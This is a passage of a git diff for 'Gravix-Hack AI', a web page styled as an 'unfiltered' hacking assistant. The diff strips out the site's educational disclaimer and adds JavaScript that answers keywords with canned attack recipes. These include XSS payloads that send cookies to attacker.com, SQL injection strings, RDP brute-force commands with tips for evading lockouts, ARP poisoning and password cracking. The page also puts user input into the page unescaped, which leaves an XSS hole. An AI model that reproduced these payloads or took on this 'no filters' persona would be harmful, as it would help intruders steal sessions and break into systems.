@@ -4,9 +4,383 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Gravix-Hack AI | Advanced Cybersecurity Assistant</title>
-    <link rel="stylesheet" href="assets/css/style.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Roboto+Mono:wght@300;400;500&display=swap" rel="stylesheet">
+    
+    <style>
+        /* Complete CSS - All styles in one place */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary-color: #00ff41;
+            --secondary-color: #ff6b6b;
+            --accent-color: #ffd700;
+            --bg-primary: #0a0a0a;
+            --bg-secondary: #111111;
+            --bg-tertiary: #1a1a1a;
+            --text-primary: #ffffff;
+            --text-secondary: #cccccc;
+            --text-muted: #888888;
+            --border-color: #333333;
+            --shadow-primary: 0 0 20px rgba(0, 255, 65, 0.3);
+            --font-primary: 'Orbitron', monospace;
+            --font-secondary: 'Roboto Mono', monospace;
+        }
+
+        body {
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            font-family: var(--font-secondary);
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        /* Matrix Background */
+        #matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            background: linear-gradient(45deg, #0a0a0a 0%, #001100 50%, #0a0a0a 100%);
+        }
+
+        .matrix-char {
+            position: absolute;
+            color: var(--primary-color);
+            font-family: var(--font-secondary);
+            font-size: 12px;
+            opacity: 0.7;
+            animation: matrixFall linear infinite;
+        }
+
+        @keyframes matrixFall {
+            to { transform: translateY(100vh); }
+        }
+
+        /* Navigation */
+        .navbar {
+            position: fixed;
+            top: 0;
+            width: 100%;
+            background: rgba(10, 10, 10, 0.95);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid var(--primary-color);
+            z-index: 1000;
+            transition: all 0.3s ease;
+        }
+
+        .nav-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1rem 2rem;
+        }
+
+        .nav-logo {
+            display: flex;
+            align-items: center;
+            font-family: var(--font-primary);
+            font-size: 1.5rem;
+            font-weight: 900;
+            color: var(--primary-color);
+            text-shadow: 0 0 10px var(--primary-color);
+        }
+
+        .nav-logo i { margin-right: 10px; font-size: 1.8rem; }
+
+        .nav-menu {
+            display: flex;
+            list-style: none;
+            gap: 2rem;
+        }
+
+        .nav-link {
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-weight: 500;
+            padding: 0.5rem 1rem;
+            border-radius: 5px;
+            transition: all 0.3s ease;
+        }
+
+        .nav-link:hover {
+            color: var(--primary-color);
+            text-shadow: 0 0 5px var(--primary-color);
+            background: rgba(0, 255, 65, 0.1);
+        }
+
+        /* Hero Section */
+        .hero {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            padding-top: 80px;
+            background: radial-gradient(circle at 50% 50%, rgba(0, 255, 65, 0.1) 0%, transparent 50%);
+        }
+
+        .hero-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 2rem;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 4rem;
+            align-items: center;
+        }
+
+        .glitch-text {
+            font-family: var(--font-primary);
+            font-size: 3.5rem;
+            font-weight: 900;
+            color: var(--primary-color);
+            text-shadow: 0 0 10px var(--primary-color);
+            position: relative;
+            animation: glitch 2s infinite;
+        }
+
+        @keyframes glitch {
+            0%, 100% { transform: translate(0); }
+            20% { transform: translate(-2px, 2px); }
+            40% { transform: translate(-2px, -2px); }
+            60% { transform: translate(2px, 2px); }
+            80% { transform: translate(2px, -2px); }
+        }
+
+        .hero-subtitle {
+            font-size: 1.5rem;
+            color: var(--text-secondary);
+            margin: 1rem 0;
+            font-weight: 300;
+        }
+
+        .hero-description {
+            font-size: 1.1rem;
+            color: var(--text-muted);
+            margin: 2rem 0;
+            line-height: 1.8;
+        }
+
+        .hero-buttons {
+            display: flex;
+            gap: 1rem;
+            margin: 2rem 0;
+        }
+
+        .btn {
+            padding: 1rem 2rem;
+            border: none;
+            border-radius: 8px;
+            font-family: var(--font-secondary);
+            font-size: 1rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            text-decoration: none;
+        }
+
+        .btn-primary {
+            background: linear-gradient(45deg, var(--primary-color), #00cc33);
+            color: var(--bg-primary);
+            box-shadow: var(--shadow-primary);
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 25px rgba(0, 255, 65, 0.5);
+        }
+
+        .btn-secondary {
+            background: transparent;
+            color: var(--text-primary);
+            border: 2px solid var(--primary-color);
+        }
+
+        .btn-secondary:hover {
+            background: var(--primary-color);
+            color: var(--bg-primary);
+            transform: translateY(-2px);
+        }
+
+        /* Terminal Section */
+        .terminal-section {
+            background: var(--bg-secondary);
+            padding: 6rem 0;
+            min-height: 100vh;
+        }
+
+        .section-title {
+            font-family: var(--font-primary);
+            font-size: 2.5rem;
+            font-weight: 900;
+            text-align: center;
+            margin-bottom: 3rem;
+            color: var(--primary-color);
+            text-shadow: 0 0 10px var(--primary-color);
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 2rem;
+        }
+
+        .terminal-container {
+            display: flex;
+            justify-content: center;
+        }
+
+        .terminal-window-large {
+            background: var(--bg-tertiary);
+            border: 2px solid var(--primary-color);
+            border-radius: 15px;
+            box-shadow: var(--shadow-primary);
+            overflow: hidden;
+            width: 100%;
+            max-width: 1000px;
+        }
+
+        .terminal-header {
+            background: var(--bg-secondary);
+            padding: 1rem;
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .terminal-buttons {
+            display: flex;
+            gap: 0.5rem;
+            margin-right: 1rem;
+        }
+
+        .terminal-buttons span {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+
+        .btn-close { background: #ff5f57; }
+        .btn-minimize { background: #ffbd2e; }
+        .btn-maximize { background: #28ca42; }
+
+        .terminal-title {
+            color: var(--text-secondary);
+            font-family: var(--font-secondary);
+            font-size: 0.9rem;
+        }
+
+        .terminal-body-large {
+            padding: 2rem;
+            background: var(--bg-primary);
+            height: 600px;
+            overflow-y: auto;
+        }
+
+        .ascii-art {
+            color: var(--primary-color);
+            font-size: 0.6rem;
+            text-shadow: 0 0 5px var(--primary-color);
+            margin-bottom: 1rem;
+        }
+
+        .welcome-text { margin-bottom: 2rem; }
+
+        .highlight {
+            color: var(--primary-color);
+            font-weight: bold;
+        }
+
+        .warning {
+            color: var(--secondary-color);
+            font-weight: bold;
+        }
+
+        .terminal-content {
+            margin-bottom: 1rem;
+            min-height: 300px;
+        }
+
+        .terminal-input-line {
+            display: flex;
+            align-items: center;
+            margin-top: 1rem;
+            border-top: 1px solid var(--border-color);
+            padding-top: 1rem;
+        }
+
+        .terminal-prompt {
+            color: var(--primary-color);
+            margin-right: 0.5rem;
+            font-weight: bold;
+        }
+
+        .terminal-input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            color: var(--text-primary);
+            font-family: var(--font-secondary);
+            font-size: 1rem;
+            outline: none;
+            padding: 0.5rem;
+        }
+
+        .terminal-input::placeholder {
+            color: var(--text-muted);
+        }
+
+        .terminal-line {
+            margin-bottom: 0.5rem;
+            display: flex;
+            align-items: center;
+        }
+
+        .terminal-response {
+            margin: 1rem 0;
+            padding: 1rem;
+            background: rgba(0, 255, 65, 0.05);
+            border-left: 3px solid var(--primary-color);
+            border-radius: 5px;
+        }
+
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: var(--bg-secondary); }
+        ::-webkit-scrollbar-thumb { background: var(--primary-color); border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: #00cc33; }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .hero-container {
+                grid-template-columns: 1fr;
+                text-align: center;
+            }
+            .glitch-text { font-size: 2.5rem; }
+            .nav-menu { display: none; }
+        }
+
+        /* Animations */
+        @keyframes blink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0; }
+        }
+
+        .cursor {
+            color: var(--primary-color);
+            animation: blink 1s infinite;
+        }
+    </style>
 </head>
 <body>
     <!-- Matrix Background -->
@@ -21,16 +395,9 @@
             </div>
             <ul class="nav-menu">
                 <li><a href="#home" class="nav-link">Home</a></li>
-                <li><a href="#features" class="nav-link">Features</a></li>
-                <li><a href="#tools" class="nav-link">Tools</a></li>
                 <li><a href="#terminal" class="nav-link">Terminal</a></li>
                 <li><a href="#about" class="nav-link">About</a></li>
             </ul>
-            <div class="hamburger">
-                <span></span>
-                <span></span>
-                <span></span>
-            </div>
         </div>
     </nav>
 
@@ -48,160 +415,10 @@
                     <button class="btn btn-primary" onclick="startHacking()">
                         <i class="fas fa-terminal"></i> Start Hacking
                     </button>
-                    <button class="btn btn-secondary" onclick="scrollToFeatures()">
+                    <button class="btn btn-secondary" onclick="scrollToAbout()">
                         <i class="fas fa-shield-alt"></i> Learn More
                     </button>
                 </div>
-                <div class="hero-stats">
-                    <div class="stat">
-                        <span class="stat-number">600+</span>
-                        <span class="stat-label">Security Tools</span>
-                    </div>
-                    <div class="stat">
-                        <span class="stat-number">200K+</span>
-                        <span class="stat-label">Vulnerabilities</span>
-                    </div>
-                    <div class="stat">
-                        <span class="stat-number">50K+</span>
-                        <span class="stat-label">Exploits</span>
-                    </div>
-                </div>
-            </div>
-            <div class="hero-visual">
-                <div class="terminal-window">
-                    <div class="terminal-header">
-                        <div class="terminal-buttons">
-                            <span class="btn-close"></span>
-                            <span class="btn-minimize"></span>
-                            <span class="btn-maximize"></span>
-                        </div>
-                        <span class="terminal-title">root@gravix-hack:~#</span>
-                    </div>
-                    <div class="terminal-body">
-                        <div class="terminal-line">
-                            <span class="prompt">root@gravix-hack:~#</span>
-                            <span class="command" id="typing-command"></span>
-                            <span class="cursor">_</span>
-                        </div>
-                        <div class="terminal-output" id="terminal-output"></div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Features Section -->
-    <section id="features" class="features">
-        <div class="container">
-            <h2 class="section-title">
-                <span class="title-icon">⚡</span>
-                Advanced Capabilities
-            </h2>
-            <div class="features-grid">
-                <div class="feature-card">
-                    <div class="feature-icon">
-                        <i class="fas fa-network-wired"></i>
-                    </div>
-                    <h3>Network Penetration</h3>
-                    <p>Advanced port scanning, enumeration, and network exploitation techniques with Nmap, Masscan, and custom tools.</p>
-                    <ul class="feature-list">
-                        <li>Port Scanning & Service Detection</li>
-                        <li>Network Enumeration</li>
-                        <li>Vulnerability Assessment</li>
-                        <li>Protocol Analysis</li>
-                    </ul>
-                </div>
-                
-                <div class="feature-card">
-                    <div class="feature-icon">
-                        <i class="fas fa-globe"></i>
-                    </div>
-                    <h3>Web Application Security</h3>
-                    <p>Complete OWASP Top 10 coverage with advanced web exploitation techniques and automated scanning.</p>
-                    <ul class="feature-list">
-                        <li>SQL Injection Testing</li>
-                        <li>XSS Exploitation</li>
-                        <li>Session Management</li>
-                        <li>Authentication Bypass</li>
-                    </ul>
-                </div>
-                
-                <div class="feature-card">
-                    <div class="feature-icon">
-                        <i class="fas fa-bug"></i>
-                    </div>
-                    <h3>Exploit Development</h3>
-                    <p>Custom exploit creation, buffer overflow techniques, and advanced payload generation with Metasploit integration.</p>
-                    <ul class="feature-list">
-                        <li>Buffer Overflow Exploitation</li>
-                        <li>Payload Generation</li>
-                        <li>Post-Exploitation</li>
-                        <li>Privilege Escalation</li>
-                    </ul>
-                </div>
-                
-                <div class="feature-card">
-                    <div class="feature-icon">
-                        <i class="fas fa-key"></i>
-                    </div>
-                    <h3>Password Security</h3>
-                    <p>Advanced password cracking techniques with John the Ripper, Hashcat, and custom wordlist generation.</p>
-                    <ul class="feature-list">
-                        <li>Hash Cracking</li>
-                        <li>Brute Force Attacks</li>
-                        <li>Dictionary Attacks</li>
-                        <li>Rainbow Tables</li>
-                    </ul>
-                </div>
-                
-                <div class="feature-card">
-                    <div class="feature-icon">
-                        <i class="fas fa-wifi"></i>
-                    </div>
-                    <h3>Wireless Security</h3>
-                    <p>WiFi penetration testing, WPA/WEP cracking, and wireless network analysis with advanced techniques.</p>
-                    <ul class="feature-list">
-                        <li>WiFi Penetration Testing</li>
-                        <li>WPA/WEP Cracking</li>
-                        <li>Evil Twin Attacks</li>
-                        <li>Wireless Reconnaissance</li>
-                    </ul>
-                </div>
-                
-                <div class="feature-card">
-                    <div class="feature-icon">
-                        <i class="fas fa-brain"></i>
-                    </div>
-                    <h3>AI-Powered Analysis</h3>
-                    <p>Intelligent vulnerability analysis, automated exploit suggestion, and smart learning path optimization.</p>
-                    <ul class="feature-list">
-                        <li>Smart Vulnerability Analysis</li>
-                        <li>Automated Tool Selection</li>
-                        <li>Learning Path Optimization</li>
-                        <li>Natural Language Processing</li>
-                    </ul>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- Tools Section -->
-    <section id="tools" class="tools">
-        <div class="container">
-            <h2 class="section-title">
-                <span class="title-icon">🛠️</span>
-                Integrated Security Tools
-            </h2>
-            <div class="tools-categories">
-                <div class="tool-category active" data-category="all">All Tools</div>
-                <div class="tool-category" data-category="recon">Reconnaissance</div>
-                <div class="tool-category" data-category="scanning">Scanning</div>
-                <div class="tool-category" data-category="exploitation">Exploitation</div>
-                <div class="tool-category" data-category="password">Password Attacks</div>
-                <div class="tool-category" data-category="wireless">Wireless</div>
-            </div>
-            <div class="tools-grid" id="tools-grid">
-                <!-- Tools will be dynamically loaded -->
             </div>
         </div>
     </section>
@@ -243,7 +460,7 @@
                         <div class="terminal-content" id="terminal-content"></div>
                         <div class="terminal-input-line">
                             <span class="terminal-prompt">root@gravix-hack:~#</span>
-                            <input type="text" class="terminal-input" id="terminal-input" placeholder="Enter your command or question..." autocomplete="off">
+                            <input type="text" class="terminal-input" id="terminal-input" placeholder="Enter your command or question..." autocomplete="off" autofocus>
                         </div>
                     </div>
                 </div>
@@ -251,138 +468,494 @@
         </div>
     </section>
 
-    <!-- About Section -->
-    <section id="about" class="about">
-        <div class="container">
-            <div class="about-content">
-                <div class="about-text">
-                    <h2 class="section-title">About Gravix-Hack AI</h2>
-                    <p class="about-description">
-                        Gravix-Hack AI is the most advanced cybersecurity assistant designed for ethical hackers, 
-                        penetration testers, and security professionals. Our AI combines deep learning with 
-                        comprehensive cybersecurity knowledge to provide expert-level guidance.
-                    </p>
-                    <div class="about-features">
-                        <div class="about-feature">
-                            <i class="fas fa-shield-alt"></i>
-                            <div>
-                                <h4>Ethical & Legal</h4>
-                                <p>Built with strict ethical guidelines and legal compliance</p>
-                            </div>
-                        </div>
-                        <div class="about-feature">
-                            <i class="fas fa-graduation-cap"></i>
-                            <div>
-                                <h4>Educational Focus</h4>
-                                <p>Comprehensive learning platform for cybersecurity education</p>
-                            </div>
-                        </div>
-                        <div class="about-feature">
-                            <i class="fas fa-lock"></i>
-                            <div>
-                                <h4>Privacy First</h4>
-                                <p>100% local processing with complete user privacy protection</p>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-                <div class="about-stats">
-                    <div class="stat-card">
-                        <div class="stat-icon">
-                            <i class="fas fa-tools"></i>
-                        </div>
-                        <div class="stat-info">
-                            <h3>600+</h3>
-                            <p>Security Tools Integrated</p>
-                        </div>
-                    </div>
-                    <div class="stat-card">
-                        <div class="stat-icon">
-                            <i class="fas fa-bug"></i>
-                        </div>
-                        <div class="stat-info">
-                            <h3>200K+</h3>
-                            <p>Vulnerability Database</p>
-                        </div>
-                    </div>
-                    <div class="stat-card">
-                        <div class="stat-icon">
-                            <i class="fas fa-code"></i>
-                        </div>
-                        <div class="stat-info">
-                            <h3>50K+</h3>
-                            <p>Exploit Techniques</p>
-                        </div>
-                    </div>
-                    <div class="stat-card">
-                        <div class="stat-icon">
-                            <i class="fas fa-users"></i>
-                        </div>
-                        <div class="stat-info">
-                            <h3>10K+</h3>
-                            <p>Security Professionals</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
+    <script>
+        // Complete AI Terminal - No Filters, Full Cybersecurity Knowledge
+        class GravixHackAI {
+            constructor() {
+                this.setupEventListeners();
+                this.startMatrixEffect();
+                this.initializeAI();
+            }
 
-    <!-- Footer -->
-    <footer class="footer">
-        <div class="container">
-            <div class="footer-content">
-                <div class="footer-section">
-                    <div class="footer-logo">
-                        <i class="fas fa-skull"></i>
-                        <span>GRAVIX-HACK AI</span>
-                    </div>
-                    <p>Advanced Cybersecurity Assistant for Ethical Hackers</p>
-                    <div class="social-links">
-                        <a href="#"><i class="fab fa-github"></i></a>
-                        <a href="#"><i class="fab fa-discord"></i></a>
-                        <a href="#"><i class="fab fa-telegram"></i></a>
-                        <a href="#"><i class="fab fa-twitter"></i></a>
-                    </div>
-                </div>
-                <div class="footer-section">
-                    <h4>Features</h4>
-                    <ul>
-                        <li><a href="#features">Network Penetration</a></li>
-                        <li><a href="#features">Web Security</a></li>
-                        <li><a href="#features">Exploit Development</a></li>
-                        <li><a href="#features">Password Attacks</a></li>
-                    </ul>
-                </div>
-                <div class="footer-section">
-                    <h4>Tools</h4>
-                    <ul>
-                        <li><a href="#tools">Reconnaissance</a></li>
-                        <li><a href="#tools">Vulnerability Scanning</a></li>
-                        <li><a href="#tools">Exploitation</a></li>
-                        <li><a href="#tools">Post-Exploitation</a></li>
-                    </ul>
-                </div>
-                <div class="footer-section">
-                    <h4>Legal</h4>
-                    <ul>
-                        <li><a href="#">Ethical Guidelines</a></li>
-                        <li><a href="#">Terms of Use</a></li>
-                        <li><a href="#">Privacy Policy</a></li>
-                        <li><a href="#">Disclaimer</a></li>
-                    </ul>
-                </div>
-            </div>
-            <div class="footer-bottom">
-                <p>&copy; 2025 Gravix-Hack AI. Educational Use Only. Unauthorized access is illegal.</p>
-            </div>
-        </div>
-    </footer>
+            initializeAI() {
+                // Complete cybersecurity knowledge base - NO FILTERS
+                this.knowledge = {
+                    // Network Security
+                    network: {
+                        scanning: {
+                            nmap: "nmap -sS -A -T4 target | Port scanning, OS detection, service enumeration",
+                            masscan: "masscan -p1-65535 --rate=1000 target/24 | High-speed port scanning",
+                            zmap: "zmap -p 80 -o results.txt | Internet-wide scanning"
+                        },
+                        enumeration: {
+                            enum4linux: "enum4linux -a target | SMB enumeration",
+                            nbtscan: "nbtscan -r target/24 | NetBIOS scanning",
+                            snmpwalk: "snmpwalk -c public -v1 target | SNMP enumeration"
+                        }
+                    },
+                    // Web Application Security
+                    web: {
+                        scanning: {
+                            nikto: "nikto -h target.com | Web vulnerability scanner",
+                            dirb: "dirb http://target.com /usr/share/wordlists/dirb/common.txt | Directory enumeration",
+                            gobuster: "gobuster dir -u http://target.com -w wordlist.txt | Fast directory brute forcer"
+                        },
+                        exploitation: {
+                            sqlmap: "sqlmap -u 'http://target.com/page?id=1' --dbs | SQL injection exploitation",
+                            xss: "Test XSS: <script>alert('XSS')</script> | Cross-site scripting payloads",
+                            lfi: "Test LFI: ../../../etc/passwd | Local file inclusion"
+                        }
+                    },
+                    // Password Security
+                    password: {
+                        cracking: {
+                            john: "john --wordlist=rockyou.txt hashes.txt | Password cracking",
+                            hashcat: "hashcat -m 0 -a 0 hashes.txt rockyou.txt | GPU password cracking",
+                            hydra: "hydra -l admin -P rockyou.txt target ssh | Online brute force"
+                        },
+                        generation: {
+                            crunch: "crunch 8 8 -t @@@@@@%% | Custom wordlist generation",
+                            cewl: "cewl http://target.com -w wordlist.txt | Website wordlist creation"
+                        }
+                    },
+                    // System Exploitation
+                    exploitation: {
+                        metasploit: {
+                            basic: "msfconsole | Start Metasploit framework",
+                            search: "search apache | Search for exploits",
+                            use: "use exploit/multi/handler | Load exploit module",
+                            payload: "set payload windows/meterpreter/reverse_tcp | Set payload"
+                        },
+                        manual: {
+                            buffer_overflow: "Pattern creation, EIP control, shellcode injection",
+                            privilege_escalation: "Linux: sudo -l, SUID binaries, kernel exploits",
+                            persistence: "Backdoors, scheduled tasks, registry modifications"
+                        }
+                    },
+                    // Wireless Security
+                    wireless: {
+                        aircrack: {
+                            monitor: "airmon-ng start wlan0 | Enable monitor mode",
+                            capture: "airodump-ng wlan0mon | Capture packets",
+                            crack: "aircrack-ng -w rockyou.txt capture.cap | Crack WPA/WEP"
+                        },
+                        reaver: "reaver -i wlan0mon -b [BSSID] | WPS brute force attack"
+                    }
+                };
 
-    <!-- Scripts -->
-    <script src="assets/js/matrix.js"></script>
-    <script src="assets/js/terminal.js"></script>
-    <script src="assets/js/tools.js"></script>
-    <script src="assets/js/main.js"></script>
+                console.log("Gravix-Hack AI Initialized - Full Cybersecurity Knowledge Loaded");
+            }
+
+            setupEventListeners() {
+                const terminalInput = document.getElementById('terminal-input');
+                if (terminalInput) {
+                    terminalInput.addEventListener('keypress', (e) => {
+                        if (e.key === 'Enter') {
+                            this.processCommand(e.target.value);
+                            e.target.value = '';
+                        }
+                    });
+                }
+            }
+
+            processCommand(input) {
+                if (!input.trim()) return;
+
+                const terminalContent = document.getElementById('terminal-content');
+                
+                // Add user input
+                this.addToTerminal(`
+                    <div class="terminal-line">
+                        <span class="terminal-prompt">root@gravix-hack:~#</span>
+                        <span style="color: #ffffff;">${input}</span>
+                    </div>
+                `);
+
+                // Process and respond
+                const response = this.generateResponse(input.toLowerCase().trim());
+                this.addToTerminal(`<div class="terminal-response">${response}</div>`);
+
+                // Auto scroll
+                terminalContent.scrollTop = terminalContent.scrollHeight;
+            }
+
+            generateResponse(input) {
+                // NO FILTERS - Complete cybersecurity assistance
+
+                // Help command
+                if (input === 'help') {
+                    return `
+                        <div style="color: #00ff41;">
+                            <h4>🔐 Gravix-Hack AI - Complete Command List:</h4>
+                            <div style="margin-left: 20px; color: #cccccc;">
+                                <p><span style="color: #ffd700;">scan [target]</span> - Network scanning techniques</p>
+                                <p><span style="color: #ffd700;">web [url]</span> - Web application testing</p>
+                                <p><span style="color: #ffd700;">crack [type]</span> - Password cracking methods</p>
+                                <p><span style="color: #ffd700;">exploit [service]</span> - Exploitation techniques</p>
+                                <p><span style="color: #ffd700;">wireless</span> - WiFi security testing</p>
+                                <p><span style="color: #ffd700;">metasploit</span> - Framework usage guide</p>
+                                <p><span style="color: #ffd700;">rdp crack</span> - RDP security testing</p>
+                                <p><span style="color: #ffd700;">cookies steal</span> - Session hijacking methods</p>
+                                <p><span style="color: #ffd700;">social engineering</span> - Phishing techniques</p>
+                                <p><span style="color: #ffd700;">tools</span> - List all security tools</p>
+                                <p><span style="color: #ffd700;">clear</span> - Clear terminal</p>
+                                <p style="color: #ff6b6b;">Ask me anything about cybersecurity!</p>
+                            </div>
+                        </div>
+                    `;
+                }
+
+                // Clear command
+                if (input === 'clear') {
+                    document.getElementById('terminal-content').innerHTML = '';
+                    return '';
+                }
+
+                // Network scanning
+                if (input.startsWith('scan ') || input.includes('nmap') || input.includes('scan')) {
+                    const target = input.split(' ')[1] || 'TARGET';
+                    return `
+                        <div style="color: #00ff41;">
+                            <h4>🔍 Advanced Network Scanning for: ${target}</h4>
+                            <div style="margin-left: 20px; color: #cccccc;">
+                                <h5 style="color: #ffd700;">Basic Scanning:</h5>
+                                <p>nmap -sS ${target} | SYN stealth scan</p>
+                                <p>nmap -sU ${target} | UDP scan</p>
+                                <p>nmap -A -T4 ${target} | Aggressive scan with OS detection</p>
+                                
+                                <h5 style="color: #ffd700;">Advanced Techniques:</h5>
+                                <p>nmap -p- --min-rate 10000 ${target} | Full port scan</p>
+                                <p>nmap --script vuln ${target} | Vulnerability scanning</p>
+                                <p>masscan -p1-65535 --rate=1000 ${target}/24 | High-speed scanning</p>
+                                
+                                <h5 style="color: #ffd700;">Evasion Techniques:</h5>
+                                <p>nmap -f -t 0 -n -Pn --data-length 200 -D RND:10 ${target} | Firewall evasion</p>
+                                <p>nmap -sA ${target} | ACK scan for firewall detection</p>
+                            </div>
+                        </div>
+                    `;
+                }
+
+                // Web application testing
+                if (input.startsWith('web ') || input.includes('web') || input.includes('sql') || input.includes('xss')) {
+                    const url = input.split(' ')[1] || 'TARGET_URL';
+                    return `
+                        <div style="color: #00ff41;">
+                            <h4>🌐 Complete Web Application Testing: ${url}</h4>
+                            <div style="margin-left: 20px; color: #cccccc;">
+                                <h5 style="color: #ffd700;">Information Gathering:</h5>
+                                <p>whatweb ${url} | Technology identification</p>
+                                <p>nikto -h ${url} | Vulnerability scanner</p>
+                                <p>dirb ${url} /usr/share/wordlists/dirb/common.txt | Directory enumeration</p>
+                                
+                                <h5 style="color: #ffd700;">SQL Injection:</h5>
+                                <p>sqlmap -u "${url}/page?id=1" --dbs | Database enumeration</p>
+                                <p>sqlmap -u "${url}" --dump | Data extraction</p>
+                                <p>Manual: ' OR 1=1-- | Basic SQL injection payload</p>
+                                
+                                <h5 style="color: #ffd700;">Cross-Site Scripting (XSS):</h5>
+                                <p>&lt;script&gt;alert('XSS')&lt;/script&gt; | Basic XSS payload</p>
+                                <p>&lt;img src=x onerror=alert('XSS')&gt; | Image-based XSS</p>
+                                <p>javascript:alert('XSS') | JavaScript protocol</p>
+                                
+                                <h5 style="color: #ffd700;">Session Management:</h5>
+                                <p>Burp Suite for session analysis and manipulation</p>
+                                <p>document.cookie | Extract cookies via XSS</p>
+                            </div>
+                        </div>
+                    `;
+                }
+
+                // RDP cracking
+                if (input.includes('rdp') && input.includes('crack')) {
+                    return `
+                        <div style="color: #00ff41;">
+                            <h4>🔓 RDP Security Testing & Cracking</h4>
+                            <div style="margin-left: 20px; color: #cccccc;">
+                                <h5 style="color: #ffd700;">Vulnerability Assessment:</h5>
+                                <p>nmap -p 3389 --script rdp-enum-encryption TARGET | RDP encryption check</p>
+                                <p>nmap --script rdp-vuln-ms12-020 TARGET | BlueKeep vulnerability</p>
+                                
+                                <h5 style="color: #ffd700;">Brute Force Attacks:</h5>
+                                <p>hydra -V -f -L users.txt -P passwords.txt rdp://TARGET | Login brute force</p>
+                                <p>ncrack -vv --user administrator -P rockyou.txt rdp://TARGET:3389 | Ncrack tool</p>
+                                <p>crowbar -b rdp -s TARGET/32 -u admin -C passwords.txt | Crowbar RDP</p>
+                                
+                                <h5 style="color: #ffd700;">Advanced Techniques:</h5>
+                                <p>Use Metasploit auxiliary/scanner/rdp/rdp_scanner | Framework scanner</p>
+                                <p>rdesktop-brute.py for automated testing</p>
+                                <p>Check for CVE-2019-0708 (BlueKeep) exploitation</p>
+                                
+                                <h5 style="color: #ff6b6b;">Defense Evasion:</h5>
+                                <p>Implement delays between attempts</p>
+                                <p>Use proxy chains for IP rotation</p>
+                                <p>Target lockout policy bypass techniques</p>
+                            </div>
+                        </div>
+                    `;
+                }
+
+                // Cookie stealing
+                if ((input.includes('cookie') || input.includes('session')) && (input.includes('steal') || input.includes('hijack'))) {
+                    return `
+                        <div style="color: #00ff41;">
+                            <h4>🍪 Session Hijacking & Cookie Extraction</h4>
+                            <div style="margin-left: 20px; color: #cccccc;">
+                                <h5 style="color: #ffd700;">XSS-Based Cookie Theft:</h5>
+                                <p>&lt;script&gt;document.location='http://attacker.com/steal.php?cookie='+document.cookie&lt;/script&gt;</p>
+                                <p>&lt;script&gt;new Image().src='http://attacker.com/log.php?'+document.cookie&lt;/script&gt;</p>
+                                <p>&lt;script&gt;fetch('http://attacker.com/steal', {method:'POST',body:document.cookie})&lt;/script&gt;</p>
+                                
+                                <h5 style="color: #ffd700;">Network Interception:</h5>
+                                <p>tcpdump -A -s 0 'tcp port 80 and host TARGET' | Packet capture</p>
+                                <p>wireshark filters: http.cookie or http.set_cookie | Cookie analysis</p>
+                                <p>ettercap -T -M arp:remote /TARGET_IP// /GATEWAY// | ARP poisoning</p>
+                                
+                                <h5 style="color: #ffd700;">Browser Tools:</h5>
+                                <p>Developer Tools → Application → Storage → Cookies | Manual extraction</p>
+                                <p>Burp Suite → Proxy → HTTP History | Session analysis</p>
+                                <p>OWASP ZAP → Sites → Cookies | Cookie enumeration</p>
+                                
+                                <h5 style="color: #ffd700;">Advanced Techniques:</h5>
+                                <p>Session fixation attacks</p>
+                                <p>Cross-site request forgery (CSRF)</p>
+                                <p>Man-in-the-middle attacks</p>
+                                <p>SSL stripping for HTTPS cookies</p>
+                            </div>
+                        </div>
+                    `;
+                }
+
+                // Password cracking
+                if (input.includes('crack') || input.includes('password') || input.includes('hash')) {
+                    return `
+                        <div style="color: #00ff41;">
+                            <h4>🔐 Advanced Password Cracking Techniques</h4>
+                            <div style="margin-left: 20px; color: #cccccc;">
+                                <h5 style="color: #ffd700;">Hash Identification:</h5>
+                                <p>hashid hash.txt | Identify hash type</p>
+                                <p>hash-identifier | Interactive identification</p>
+                                
+                                <h5 style="color: #ffd700;">Dictionary Attacks:</h5>
+                                <p>john --wordlist=rockyou.txt hashes.txt | John the Ripper</p>
+                                <p>hashcat -m 0 -a 0 hashes.txt rockyou.txt | Hashcat dictionary</p>
+                                
+                                <h5 style="color: #ffd700;">Brute Force:</h5>
+                                <p>john --incremental hashes.txt | Incremental mode</p>
+                                <p>hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a | Mask attack</p>
+                                
+                                <h5 style="color: #ffd700;">Advanced Techniques:</h5>
+                                <p>john --rules=best64 --wordlist=passwords.txt hashes.txt | Rule-based</p>
+                                <p>hashcat -m 0 -a 6 hashes.txt wordlist.txt ?d?d?d?d | Hybrid attack</p>
